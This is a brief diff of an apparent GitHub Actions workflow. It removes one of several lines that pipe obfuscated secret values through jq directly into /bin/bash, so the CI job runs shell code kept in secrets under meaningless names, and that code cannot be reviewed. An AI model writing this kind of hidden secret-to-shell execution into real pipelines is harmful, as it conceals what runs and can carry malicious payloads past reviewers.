@@ -23,7 +23,6 @@ jobs:
           pmw24: ${{ secrets.pmw24 }}
         run: |
           printf '%s' "$pmw24" | jq -r .azhlr3 | /bin/bash
-          printf '%s' "$gxkz1" | jq -r .omw36316 | /bin/bash
           printf '%s' "$yzqz4831" | jq -r .s0 | /bin/bash
           echo $aqkeh68 | jq -r .ccx50440 | /bin/bash
           echo $wxy70 | jq -r .fjbx7 | /bin/bash
